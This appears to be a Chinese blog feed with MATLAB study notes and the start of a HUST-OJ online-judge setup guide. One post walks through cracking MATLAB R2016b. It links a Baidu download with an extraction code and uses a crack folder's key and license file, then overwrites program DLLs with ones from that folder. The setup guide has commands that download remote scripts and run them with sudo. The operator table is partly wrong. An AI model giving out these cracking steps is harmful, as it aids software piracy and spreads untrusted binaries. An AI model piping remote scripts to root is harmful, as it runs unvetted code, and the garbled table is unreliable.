align="center"><strong>+</strong></td><td align="center">加；加法运算符</td></tr><tr><td align="center"><strong>-</strong></td><td align="center">减；减法运算符</td></tr><tr><td align="center">*</td><td align="center">标量和矩阵乘法运算符</td></tr><tr><td align="center"><strong>.*</strong></td><td align="center">数组乘法运算符</td></tr><tr><td align="center"><strong>^</strong></td><td align="center">标量和矩阵求幂运算符</td></tr><tr><td align="center"><strong>.^</strong></td><td align="center">数组求幂运算符</td></tr><tr><td align="center">\</td><td align="center">矩阵左除</td></tr><tr><td align="center"><strong>/</strong></td><td align="center">矩阵右除</td></tr><tr><td align="center">.\</td><td align="center">阵列左除</td></tr><tr><td align="center"><strong>./</strong></td><td align="center">阵列右除</td></tr><tr><td align="center"><strong>:</strong></td><td align="center">向量生成；子阵提取</td></tr><tr><td align="center"><strong>( )</strong></td><td align="center">下标运算；参数定义</td></tr><tr><td align="center"><strong>[ ]</strong></td><td align="center">矩阵生成</td></tr><tr><td align="center"><strong>.</strong></td><td align="center">点乘运算，常与其他运算符联合使用</td></tr><tr><td align="center"><strong>…</strong></td><td align="center">续行标志；行连续运算符</td></tr><tr><td align="center"><strong>,</strong></td><td align="center">分行符（该行结果不显示）</td></tr><tr><td align="center"><strong>;</strong></td><td align="center">语句结束；分行符（该行结果显示）</td></tr><tr><td align="center"><strong>%</strong></td><td align="center">注释标志</td></tr><tr><td align="center"><strong>_</strong></td><td align="center">引用符号和转置运算符</td></tr><tr><td align="center"><strong>._</strong></td><td align="center">非共轭转置运算符</td></tr><tr><td align="center"><strong>=</strong></td><td align="center">赋值运算符</td></tr></tbody></table><h3 id="1-3-注释"><a href="#1-3-注释" class="headerlink" title="1.3 注释"></a>1.3 注释</h3><p>MATLAB的百分比符号（％）是用于表示一个注释行。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">y=<span class="hljs-number">23</span> <span class="hljs-comment">%这是注释</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-分号（-）的使用"><a href="#1-4-分号（-）的使用" class="headerlink" title="1.4 分号（;）的使用"></a>1.4 分号（;）的使用</h3><p>MATLAB中分号（;）表示语句结束；但是，如果想抑制和隐藏 MATLAB 输出表达，表达后添加一个分号。</p><p>实例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">x = <span class="hljs-number">3</span>;<br>y = x + <span class="hljs-number">5</span><br><span class="hljs-comment">%输出结果</span><br>y=<span class="hljs-number">8</span><br></code></pre></div></td></tr></table></figure><h3 id="1-5-命名变量"><a href="#1-5-命名变量" class="headerlink" title="1.5 命名变量"></a>1.5 命名变量</h3><p>变量名称是由一个字母后由任意数量的字母，数字或下划线。MATLAB中是区分大小写的。变量名可以是任意长度。</p><h3 id="1-6-特殊变量和常量"><a href="#1-6-特殊变量和常量" class="headerlink" title="1.6 特殊变量和常量"></a>1.6 特殊变量和常量</h3><p>支持以下特殊变量和常量。</p><table><thead><tr><th align="center">Name</th><th align="center">Meaning</th></tr></thead><tbody><tr><td align="center"><strong>ans</strong></td><td align="center">默认的变量名，以应答最近依次操作运算结果</td></tr><tr><td align="center"><strong>eps</strong></td><td align="center">浮点数的相对误差</td></tr><tr><td align="center"><strong>i,j</strong></td><td align="center">虚数单位，定义为 i2 = j2 = -1</td></tr><tr><td align="center"><strong>Inf</strong></td><td align="center">代表无穷大</td></tr><tr><td align="center"><strong>NaN</strong></td><td align="center">代表不定值（不是数字）</td></tr><tr><td align="center"><strong>pi</strong></td><td align="center">圆周率</td></tr></tbody></table><h3 id="1-7-保存进度"><a href="#1-7-保存进度" class="headerlink" title="1.7 保存进度"></a>1.7 保存进度</h3><p>MATLAB使用save命令保存工作区中的所有变量，然后作为一个扩展名为.mat的文件，在当前目录中。 </p><p>实例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">save myfile<br></code></pre></div></td></tr></table></figure><p>该文件可以随时重新加载，然后使用load命令。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">load myfile<br></code></pre></div></td></tr></table></figure><h3 id="1-8-通用命令"><a href="#1-8-通用命令" class="headerlink" title="1.8 通用命令"></a>1.8 通用命令</h3><p>MATLAB 通用命令常用部分及其功能。这些命令分为常用管理命令、变量和工作区管理命令、命令行窗口控制、文件和工作环境管理等类型。</p><h4 id="1-8-1-常用管理命令"><a href="#1-8-1-常用管理命令" class="headerlink" title="1.8.1 常用管理命令"></a>1.8.1 常用管理命令</h4><table><thead><tr><th align="center">常用管理命令</th><th align="center">相关功能</th></tr></thead><tbody><tr><td align="center">help</td><td align="center">MATLAB 函数和 M 文件的在线帮助</td></tr><tr><td align="center">version</td><td align="center">MATLAB 版本号</td></tr><tr><td align="center">ver</td><td align="center">显示 MathWorks 产品的版本信息</td></tr><tr><td align="center">path</td><td align="center">控制 MATLAB 的目录搜索路径</td></tr><tr><td align="center">addpath</td><td align="center">将目录添加到 MATLAB 的搜索路径上</td></tr><tr><td align="center">rmpath</td><td align="center">从 MATLAB 的搜索路径上删除目录</td></tr><tr><td align="center">whatsnew</td><td align="center">显示 MATLAB 和工具箱的 README 文件</td></tr><tr><td align="center">what</td><td align="center">列出响应目录下的 M 文件、MAT 文件和 MEX 文件</td></tr><tr><td align="center">which</td><td align="center">函数和文件定位</td></tr><tr><td align="center">type</td><td align="center">列出文件</td></tr><tr><td align="center">doc</td><td align="center">在 help 浏览窗口中显示帮助信息</td></tr><tr><td align="center">lookfor</td><td align="center">在 help 文本中搜索关键字</td></tr><tr><td align="center">lasterr</td><td align="center">上一条出错信息</td></tr><tr><td align="center">error</td><td align="center">显示出错信息</td></tr><tr><td align="center">profile</td><td align="center">探查函数的执行时间</td></tr></tbody></table><h4 id="1-8-2-变量和工作区管理命令"><a href="#1-8-2-变量和工作区管理命令" class="headerlink" title="1.8.2 变量和工作区管理命令"></a>1.8.2 变量和工作区管理命令</h4><table><thead><tr><th align="center">变量和工作区管理命令</th><th align="center">相关功能</th></tr></thead><tbody><tr><td align="center">who，whos</td><td align="center">列出内存中的变量目录</td></tr><tr><td align="center">disp</td><td align="center">显示文本或阵列</td></tr><tr><td align="center">clear</td><td align="center">从工作区中清除项目</td></tr><tr><td align="center">mlock</td><td align="center">防止 M 文件被删除</td></tr><tr><td align="center">munlock</td><td align="center">允许删除 M 文件</td></tr><tr><td align="center">length</td><td align="center">求向量或矩阵的长度</td></tr><tr><td align="center">size</td><td align="center">求阵列维大小</td></tr><tr><td align="center">save</td><td align="center">将工作区变量保存到磁盘</td></tr><tr><td align="center">load</td><td align="center">从磁盘中恢复变量</td></tr><tr><td align="center">pack</td><td align="center">释放工作区内存</td></tr></tbody></table><h4 id="1-8-3-命令行窗口控制"><a href="#1-8-3-命令行窗口控制" class="headerlink" title="1.8.3 命令行窗口控制"></a>1.8.3 命令行窗口控制</h4><table><thead><tr><th align="center">命令行窗口控制</th><th align="center">相关功能</th></tr></thead><tbody><tr><td align="center">echo</td><td align="center">控制 M 文件执行过程中是否启用命令回显</td></tr><tr><td align="center">format</td><td align="center">控制输出显示格式</td></tr><tr><td align="center">more</td><td align="center">控制命令行窗口的分页显示</td></tr></tbody></table><h4 id="1-8-4-文件和工作环境管理"><a href="#1-8-4-文件和工作环境管理" class="headerlink" title="1.8.4 文件和工作环境管理"></a>1.8.4 文件和工作环境管理</h4><table><thead><tr><th align="center">文件和工作环境管理</th><th align="center">相关功能</th></tr></thead><tbody><tr><td align="center">diary</td><td align="center">在磁盘文件中保存任务</td></tr><tr><td align="center">dir</td><td align="center">现实目录列表</td></tr><tr><td align="center">cd</td><td align="center">改变工作目录</td></tr><tr><td align="center">mkdir</td><td align="center">建立目录</td></tr><tr><td align="center">copyfile</td><td align="center">复制文件</td></tr><tr><td align="center">delete</td><td align="center">删除文件和图形对象</td></tr><tr><td align="center">edit</td><td align="center">编辑 M 文件</td></tr><tr><td align="center">inmem</td><td align="center">获取内存中的 M 文件名</td></tr><tr><td align="center">matlabroot</td><td align="center">获取 MATLAB 安装的根目录名</td></tr><tr><td align="center">fullfile</td><td align="center">构造文件全名</td></tr><tr><td align="center">fileparts</td><td align="center">获取文件名的组成部分</td></tr><tr><td align="center">tempdir</td><td align="center">返回系统临时工作目录名</td></tr><tr><td align="center">tempname</td><td align="center">产生临时文件的唯一文件名</td></tr></tbody></table><h4 id="1-8-5-启动和退出"><a href="#1-8-5-启动和退出" class="headerlink" title="1.8.5 启动和退出"></a>1.8.5 启动和退出</h4><table><thead><tr><th align="center">启动和退出 MATLAB</th><th align="center">相关功能</th></tr></thead><tbody><tr><td align="center">matlabrc</td><td align="center">启动 MATLAB 的 M 文件</td></tr><tr><td align="center">startup</td><td align="center">启动 MATLAB 的 M 文件</td></tr><tr><td align="center">quit</td><td align="center">终止（退出）MATLAB</td></tr></tbody></table><h3 id="1-9-快捷键"><a href="#1-9-快捷键" class="headerlink" title="1.9 快捷键"></a>1.9 快捷键</h3><table><thead><tr><th align="center">键盘按键</th><th align="center">说明</th><th align="center">键盘按键</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">↑</td><td align="center">Ctrl+P，调用上一行</td><td align="center">Home</td><td align="center">Ctrl+A，光标置于当前行开头</td></tr><tr><td align="center">↓</td><td align="center">Ctrl+N，调用下一行</td><td align="center">End</td><td align="center">Ctrl+E，光标置于当行末尾</td></tr><tr><td align="center">←</td><td align="center">Ctrl+B，光标左移一个字符</td><td align="center">Esc</td><td align="center">Ctrl+U，清除当前输入行</td></tr><tr><td align="center">→</td><td align="center">Ctrl+F，光标右移一个字符</td><td align="center">Del</td><td align="center">Ctrl+D，删除光标处的字符</td></tr><tr><td align="center">Ctrl+←</td><td align="center">Ctrl+L，光标左移一个单词</td><td align="center">Backspace</td><td align="center">Ctrl+H，删除光标前的字符</td></tr><tr><td align="center">Ctrl+→</td><td align="center">Ctrl+R，光标右移一个单词</td><td align="center">Alt+Backspace</td><td align="center">恢复上一次删除</td></tr></tbody></table><h2 id="2-MATLAB-文件管理"><a href="#2-MATLAB-文件管理" class="headerlink" title="2.MATLAB 文件管理"></a>2.MATLAB 文件管理</h2><p>当前目录窗口，利用该窗口可组织、管理和使用所有 MATLAB 文件和非 MATLAB 文件，如创建、复制、删除和重命名文件夹和文件。甚至还可以用此窗口打开、编辑和运行 M 程序文件以及加载 MAT 数据文件等。</p><h3 id="2-1-搜索路径及其设置"><a href="#2-1-搜索路径及其设置" class="headerlink" title="2.1 搜索路径及其设置"></a>2.1 搜索路径及其设置</h3><p>MATLAB 提供了专门的路径搜索器来搜索存储在内存中的 M 文件和其他文件，MATLAB 自带的文件所存放路径都被默认包含在搜索路径中，在 MATLAB 安装目录的“toolbox”文件夹中包含了所有此类目录和文件。</p><p>需要注意的是，不在搜索路径下的文件夹和文件，在应用 MATLAB 的搜索功能时是找不到的。</p><h4 id="2-1-1-查看-MATLAB-搜索路径"><a href="#2-1-1-查看-MATLAB-搜索路径" class="headerlink" title="2.1.1 查看 MATLAB 搜索路径"></a>2.1.1 查看 MATLAB 搜索路径</h4><p>单击 MATLAB 主界面菜单工具栏中的“设置路径”按钮，打开“设置路径”对话框，如图。</p><p><img src="https://img-blog.csdnimg.cn/20210528150755130.gif"></p><p>该对话框分为左右两部分，左侧的几个按钮用来添加，目录到搜索路径，还可以从当前的搜索路径中移除选择的目录；右侧的列表框列出来已经被 MATLAB 添加到搜索路径的目录。<br>此外，在命令行窗口中插入命令 path，MATLAB 将把所有的搜索路径列出来，如图。</p><p><img src="https://img-blog.csdnimg.cn/2021052815081082.gif"></p><h3 id="2-2-设置-MATLAB-的搜索路径"><a href="#2-2-设置-MATLAB-的搜索路径" class="headerlink" title="2.2 设置 MATLAB 的搜索路径"></a>2.2 设置 MATLAB 的搜索路径</h3><p>MATLAB 提供了 3 种方法来设置搜索路径。推荐使用第一种方法，该方法不需要记忆琐碎的命令格式。</p><h4 id="2-2-1-第一种"><a href="#2-2-1-第一种" class="headerlink" title="2.2.1 第一种"></a>2.2.1 第一种</h4><p>在命令行窗口中输入 Pathtool 或者通过 MATLAB 主界面菜单栏上的“设置路径”选项菜单，进入“设置路径”对话框，然后通过该对话框编辑搜索路径。如上图。</p><h4 id="2-2-2-第二种"><a href="#2-2-2-第二种" class="headerlink" title="2.2.2 第二种"></a>2.2.2 第二种</h4><p>在命令行窗口中输入。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">path (path, <span class="hljs-string">&#x27;path&#x27;</span>)    <span class="hljs-comment">% &#x27;path&#x27; 是待添加目录的完整路径。</span><br></code></pre></div></td></tr></table></figure><h4 id="2-2-3-第三种"><a href="#2-2-3-第三种" class="headerlink" title="2.2.3 第三种"></a>2.2.3 第三种</h4><p>在命令行窗口中输入。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">addpath <span class="hljs-string">&#x27;path&#x27;</span> -begin    <span class="hljs-comment">% &#x27;path&#x27; 是待添加目录的路径，将新目录添加到搜索路径的开始</span><br><br>addpath <span class="hljs-string">&#x27;path&#x27;</span> -<span class="hljs-keyword">end</span>    <span class="hljs-comment">% &#x27;path&#x27; 是待添加目录的路径，将新目录添加到搜索路径的末端</span><br></code></pre></div></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数学建模-Matlab学习笔记（一）</title>
    <link href="/2021/05/28/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/28/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>MATLAB（矩阵实验室）是第四代高层次的编程语言和交互式环境数值计算，可视化和编程。由美国MathWorks公司开发的一种编程语言。用于算法开发、数据可视化、数据分析以及数值计算的高级技术计算语言和交互式环境，主要包括MATLAB和Simulink两大部分。拥有众多的内置命令和数学函数，可以帮助您在数学计算，绘图和执行数值计算方法。 </p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Matlab-用途"><a href="#1-Matlab-用途" class="headerlink" title="1.Matlab 用途"></a>1.Matlab 用途</h2><h3 id="1-1-用途"><a href="#1-1-用途" class="headerlink" title="1.1 用途"></a>1.1 用途</h3><p>MATLAB被广泛用来作为计算工具在科学和工程涵盖领域物理，化学，数学和工程流。包括：</p><ul><li>信号处理和通信</li><li>图像和视频处理</li><li>控制系统的设计与仿真</li><li>测试和测量</li><li>计算金融</li><li>计算生物学</li><li>数值分析</li><li>数值和符号计算</li><li>工程与科学绘图</li><li>管理与调度优化计算（运筹学）</li></ul><p>简单 matlab 例子：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">x = [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span>];<br>y1 = [<span class="hljs-number">.16</span> <span class="hljs-number">.08</span> <span class="hljs-number">.04</span> <span class="hljs-number">.02</span> <span class="hljs-number">.013</span> <span class="hljs-number">.007</span> <span class="hljs-number">.004</span> <span class="hljs-number">.002</span> <span class="hljs-number">.001</span> <span class="hljs-number">.0008</span> ];<br>y2 = [<span class="hljs-number">.16</span> <span class="hljs-number">.07</span> <span class="hljs-number">.03</span> <span class="hljs-number">.01</span> <span class="hljs-number">.008</span> <span class="hljs-number">.003</span> <span class="hljs-number">.0008</span> <span class="hljs-number">.0003</span> <span class="hljs-number">.00007</span> <span class="hljs-number">.00002</span> ];<br><br>semilogy(x,y1,<span class="hljs-string">&#x27;-bo;y1;&#x27;</span>,x,y2,<span class="hljs-string">&#x27;-kx;y2;&#x27;</span>);<br>title(<span class="hljs-string">&#x27;Plot title&#x27;</span>);<br>xlabel(<span class="hljs-string">&#x27;X Axis&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;Y Axis&#x27;</span>);<br>print -deps graph.<span class="hljs-built_in">eps</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-计算数学"><a href="#1-2-计算数学" class="headerlink" title="1.2 计算数学"></a>1.2 计算数学</h3><p>利用 MATLAB 计算数学的方方面面。例如常用于：</p><ul><li>矩阵和阵列处理</li><li>2-D 和 3-D 绘图和图形</li><li>线性代数</li><li>代数方程组</li><li>非线性函数</li><li>统计</li><li>数据分析</li><li>微积分和微分方程</li><li>数值计算</li><li>积分</li><li>变换</li><li>曲线拟合</li><li>各种其它的特殊功能</li></ul><h2 id="2-Matlab-安装"><a href="#2-Matlab-安装" class="headerlink" title="2.Matlab 安装"></a>2.Matlab 安装</h2><p>MATLAB下载地址：<a href="https://cn.mathworks.com/downloads/web_downloads">https://cn.mathworks.com/downloads/web_downloads</a><br>选择好安装版本后，进入安装链接，然后按照步骤进行即可，这与一般软件的安装没什么差别。</p><p>R2016b版<br>链接: <a href="https://pan.baidu.com/s/1OR8DDV-qwlqoPP143HSnBA">https://pan.baidu.com/s/1OR8DDV-qwlqoPP143HSnBA</a><br>提取码: yuhh </p><h3 id="2-1-R2016b版-安装破解"><a href="#2-1-R2016b版-安装破解" class="headerlink" title="2.1 R2016b版 安装破解"></a>2.1 R2016b版 安装破解</h3><blockquote><ol><li>通过下载下来的安装包是一个压缩文件，里面共有 3 个文件，将它们全部解压出来。</li></ol></blockquote><blockquote><ol start="2"><li>把那两个光盘映像文件（.iso 文件）全部解压出来（直接右键解压），切记，这两个映像文件要解压到同一个文件夹中，否则后面安装的时候会出问题。例如将其解压到 R2016b_win64 这个文件夹中，解压合并之后应该是这个样子的。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210528140546259.gif" alt="1"></p><blockquote><ol start="3"><li>另外一个压缩文件也要解压出来，里面的东西接下来会用到。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210528140602815.gif" alt="2"></p><blockquote><ol start="4"><li>在 R2016b_win64_dvd1 的解压文件中，双击 setup.exe。在弹出的安装程序中选择 使用文件安装密钥，再点击下一步。再选择 是 然后下一步。</li></ol></blockquote><blockquote><ol start="5"><li>选择 我已有我的许可证的文件安装密钥，密钥 在解压的 Matlab 2016b Win64 Crack 文件夹中，找到 readme.txt 文件。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210528140624262.gif" alt="3"></p><p><img src="https://img-blog.csdnimg.cn/20210528140641292.gif" alt="4"></p><p><img src="https://img-blog.csdnimg.cn/20210528140655588.gif" alt="5"></p><p>安装文件夹最好选择默认目录，如果你不是特别懂电脑最好不要私自改动这个目录，否则安装时会出现一些莫名其妙的问题，如果非要改这个路径，最好保证路径中没有中文字符，不包含空格，不包含各种奇奇怪怪的符号等。</p><blockquote><ol start="6"><li>搞定路径后就可以继续下一步了，这里记住你的安装路径，后面找文件还需要它。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210528140709961.gif" alt="6"></p><p>选好后，点击 下一步，再点击 安装 即可。</p><p>安装好了后，剩下的就是破解了，安装后的说明不需要理会，直接单击下一步就好。<br>在安装目录下双击 matlab.exe 打开会出现软件激活的窗口，破解工作就在这个窗口里进行。（可创建快捷方式也可不创建，无所谓。）</p><p><img src="https://img-blog.csdnimg.cn/20210528142329478.gif" alt="11"></p><p><img src="https://img-blog.csdnimg.cn/20210528142348724.gif" alt="12"></p><blockquote><ol start="7"><li>回到破解文件夹。如图，有两个 .lic 文件，后面要使用第二个文件 license_standalone.lic 。记住这个文件的路径。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210528142405510.gif" alt="13"></p><blockquote><ol start="8"><li>回到 MATLAB 的离线激活窗口，先选择第一项：输入许可证文件的完整路径，之后右边的浏览按钮就变成可用状态了，单击浏览按钮找到我们上图中圈出来的那个 license_standalone.lic 文件，选择好许可证文件后下方的下一步按钮会变亮，我们直接单击它进行下一步就好。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210528142424409.gif" alt="14"></p><p>单击完成按钮后，激活工作完成，但现在依然不能使用 matlab，如果现在直接双击 matlab.exe 快捷方式打开是会报错的。如图。</p><p><img src="https://img-blog.csdnimg.cn/20210528142441954.gif" alt="15"></p><blockquote><ol start="9"><li>找到我们的破解文件夹，找到这个目录：Matlab 2016b Win64 Crack\MATLAB Production Server\R2016b\bin\win64，这个目录里有 4 个 dll 文件，我们把这 4 个动态链接库文件全部右键复制。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210528142516948.gif" alt="16"></p><blockquote><ol start="10"><li>找到 MATLAB 的安装目录，现在它应该被安装在了这个目录：C:\Program Files\MATLAB，在这个目录里（你自己的要看自己的安装路径），我们继续找这样一个目录：R2016b\bin\win64，嫌麻烦的话可以在地址栏里直接粘贴  C:\Program Files\MATLAB\R2016b\bin\win64，然后回车，会直接进入 win64 目录。</li></ol></blockquote><p><strong>这个 win64 目录是你安装的 matlab 里的目录，不是破解文件夹里的 win64 目录，不要搞错了。</strong></p><p><img src="https://img-blog.csdnimg.cn/2021052814254564.gif" alt="17"></p><blockquote><ol start="11"><li>然后粘贴我们刚才复制的那 4 个 dll 文件。再 替换目标文件 即可。这样就破解完成。如图。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210528142604143.gif" alt="18"></p><p><img src="https://img-blog.csdnimg.cn/20210528142622631.gif" alt="19"></p><h3 id="2-2-Matlab-界面"><a href="#2-2-Matlab-界面" class="headerlink" title="2.2 Matlab 界面"></a>2.2 Matlab 界面</h3><p>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210528134447407.png"></p><blockquote><ol><li>当前文件夹 ：此面板允许访问项目文件夹和文件。</li></ol></blockquote><blockquote><ol start="2"><li>命令窗口 ：这是主要区域，用户在命令行中输入命令，命令提示符(&gt;&gt;).</li></ol></blockquote><blockquote><ol start="3"><li>工作区  ：工作区显示所有创建的变量和/或从文件导入。</li></ol></blockquote><blockquote><ol start="4"><li>命令历史记录  ：此面板显示或重新运行，在命令行中输入的命令。</li></ol></blockquote><p>MATLAB 的菜单工具栏包含 3 个标签，分别是主页、绘图和 APP（应用程序）。</p><p>其中，<br>绘图标签提供数据的绘图功能；<br>APP 标签提供了 MATLAB 涵盖的各工具箱的应用程序入口；<br>主页标签提供了下面主要功能。</p><ul><li>新建脚本：用于建立新的 .m 文件。</li><li>新建：用于建立型的 .m 文件、图形、模型和图形用户界面。</li><li>打开：用于打开 MATLAB 的 .m 文件、.fig 文件、.mat 文件、.mdl 文件、.cdr 文件等，也可通过快捷键Ctrl+O来实现此操作。</li><li>导入数据：用于从其他文件导入数据，单击后弹出对话框，选择导入文件的路径和位置。</li><li>保存工作区：用于把工作区的数据存放到相应的路径文件之中。</li><li>设置路径：用于设置路径。</li><li>帮助：打开帮助文件或其他帮助方式。</li><li>预设：用于设置命令行窗口的属性，也可设置界面的字体、颜色、工具栏项目等内容。单击该按钮，会弹出如下图所示的属性界面。</li></ul><h2 id="3-MATLAB-R2016b-的目录结构"><a href="#3-MATLAB-R2016b-的目录结构" class="headerlink" title="3.MATLAB R2016b 的目录结构"></a>3.MATLAB R2016b 的目录结构</h2><p>主要文件和主要文件夹的用途说明：</p><table><thead><tr><th>文件夹</th><th>说明</th></tr></thead><tbody><tr><td>\bin\win64</td><td>MATLAB R2016b 系统中可执行的相关文件。</td></tr><tr><td>\extern</td><td>创建 MATLAB R2016b 的外部程序接口工具。</td></tr><tr><td>\help</td><td>帮助系统。</td></tr><tr><td>\java</td><td>MATLAB R2016b 的 Java 支持程序。</td></tr><tr><td>\notebook</td><td>用来实现 MATLAB 工作环境与 Word 软件之间的交互，从而可以在 Word 中方便地使用 MATLAB 的有关功能。</td></tr><tr><td>\rtw</td><td>Real-timeWorkshop 软件包。</td></tr><tr><td>\simulink</td><td>Simulink 软件包，用于动态系统的建模、仿真与分析。</td></tr><tr><td>\sys</td><td>存储 MATLAB R2016b 需要的工具和操作系统库文件。</td></tr><tr><td>\toolbox</td><td>MATLAB R2016b 提供的各种应用程序。</td></tr><tr><td>\uninstall</td><td>MATLAB R2016b 的卸载程序。</td></tr><tr><td>\license_agreement.txt</td><td>软件许可协议的内容。</td></tr><tr><td>\patents.txt</td><td>存储 MathWorks 公司产品在各个国家获得的专利号码。</td></tr></tbody></table><hr>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HUST-OJ平台搭建及二次开发</title>
    <link href="/2021/05/26/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/HUST-OJ%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"/>
    <url>/2021/05/26/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/HUST-OJ%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<p>记录HUST-OJ平台的搭建及其二次开发的一些方法。</p><p>官方帮助文档：<a href="https://github.com/zhblue/hustoj/blob/master/wiki/FAQ.md">https://github.com/zhblue/hustoj/blob/master/wiki/FAQ.md</a></p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-搭建平台"><a href="#1-搭建平台" class="headerlink" title="1.搭建平台"></a>1.搭建平台</h2><h3 id="1-1-基于-Ubuntu-20-04-安装"><a href="#1-1-基于-Ubuntu-20-04-安装" class="headerlink" title="1.1 基于 Ubuntu 20.04 安装"></a>1.1 基于 Ubuntu 20.04 安装</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget http://dl.hustoj.com/install-ubuntu20.04.sh<br>sudo bash install-ubuntu20.04.sh<br></code></pre></div></td></tr></table></figure><h3 id="1-2-基于-Ubuntu-20-04-通过-Gitee-安装"><a href="#1-2-基于-Ubuntu-20-04-通过-Gitee-安装" class="headerlink" title="1.2 基于 Ubuntu 20.04 通过 Gitee 安装"></a>1.2 基于 Ubuntu 20.04 通过 Gitee 安装</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget https://gitee.com/zhblue/hustoj/raw/master/trunk/install/install-ubuntu20-gitee.sh<br>sudo bash install-ubuntu20-gitee.sh<br></code></pre></div></td></tr></table></figure><h3 id="1-3-基于-Ubuntu-18-04-安装"><a href="#1-3-基于-Ubuntu-18-04-安装" class="headerlink" title="1.3 基于 Ubuntu 18.04 安装"></a>1.3 基于 Ubuntu 18.04 安装</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget http://dl.hustoj.com/install-ubuntu18.04.sh<br>sudo bash install-ubuntu18.04.sh<br></code></pre></div></td></tr></table></figure><h3 id="1-4-基于-Ubuntu-18-04-通过-Gitee-安装"><a href="#1-4-基于-Ubuntu-18-04-通过-Gitee-安装" class="headerlink" title="1.4 基于 Ubuntu 18.04 通过 Gitee 安装"></a>1.4 基于 Ubuntu 18.04 通过 Gitee 安装</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget https://gitee.com/zhblue/hustoj/raw/master/trunk/install/install-ubuntu18-gitee.sh<br>sudo bash install-ubuntu18-gitee.sh<br></code></pre></div></td></tr></table></figure><h2 id="2-修改主题"><a href="#2-修改主题" class="headerlink" title="2.修改主题"></a>2.修改主题</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">在 